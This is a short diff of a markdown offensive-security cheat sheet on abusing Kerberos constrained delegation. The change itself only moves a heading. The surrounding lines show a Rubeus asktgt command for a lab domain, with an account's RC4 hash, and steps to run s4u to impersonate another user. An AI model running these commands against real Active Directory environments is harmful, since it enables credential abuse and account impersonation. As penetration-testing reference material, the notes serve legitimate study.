@@ -734,15 +734,16 @@ There are three steps in this attack flow ```TGT -> TGS -> Delegated TGS (with v
 2) Run Rubeus ```s4u``` to impersonate the user whose idenity we wish to steal with ```/impersonateuser:```, and making sure to set the correct ```/msdsspn:``` as advertised in ```msds-allowedtodelegateto```
 * * *
 
+
+#### Rubeus SFU - constrained delegation user 
+
+
 #### Requesting an initial User or MachineAccount (possessing constrained delegation) TGT:
 Use ```/outfile:``` or ```/nowrap``` if copy pasting - 
  
 ```./Rubeus.exe asktgt /domain:ecorp.lab /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /outfile:C:\Temp\webtgt.kirbi```
 
 #### Using S4U and the previous TGT, request a delegated TGS by specifying the msDS-AllowedToDelegateTo Service:
-
-
-#### Rubeus SFU - constrained delegation user 
 
 Rubeus (optional ```/domain``` ```/dc``` ; and ```/ptt```):
 
